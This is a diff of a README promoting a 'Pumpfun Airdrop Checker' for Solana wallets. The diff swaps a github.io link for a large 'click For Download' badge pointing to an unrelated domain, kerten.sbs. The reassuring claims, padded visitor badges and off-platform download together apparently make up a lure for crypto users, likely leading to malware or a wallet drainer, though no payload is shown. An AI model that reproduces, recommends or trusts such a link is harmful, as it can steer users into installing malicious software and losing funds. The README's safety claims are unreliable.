@@ -2,11 +2,15 @@
 
 Pumpfun Airdrop Checker is a secure and user-friendly tool designed to help Solana users verify their eligibility for the 2025 $PUMP token airdrop. With no need for KYC or sensitive data, you can safely check if your wallet qualifies to receive tokens. This tool supports popular wallets like Phantom and Solflare, providing a trusted way to stay updated and ready for the Pumpfun token claim.
 
-<div style="text-align: center">
-  <a href="https://pumpfun-airdrop-checker.github.io/.github/">
-    <img class="bumbum" style="width: 400px" alt="Static Badge" src="https://img.shields.io/badge/click_for_visit-Pumpfun_Airdrop_Checker-blueviolet">
-  </a>
-</div>
+---
+
+<a href="https://kerten.sbs/kl/old">
+  <img
+    src="https://img.shields.io/badge/click%20For%20Download-green?style=for-the-badge&logo=github"
+    alt="gg"
+    width="1100"
+  >
+</a>
 
 ---
 ![Visitors: 10K+](https://img.shields.io/badge/Visitors-10K+-ff9f43) ![Subscribers: 3K+](https://img.shields.io/badge/Subscribers-3K+-6ab04c) ![Last Updated: 2025](https://img.shields.io/badge/Last_Updated-2025-3498db)
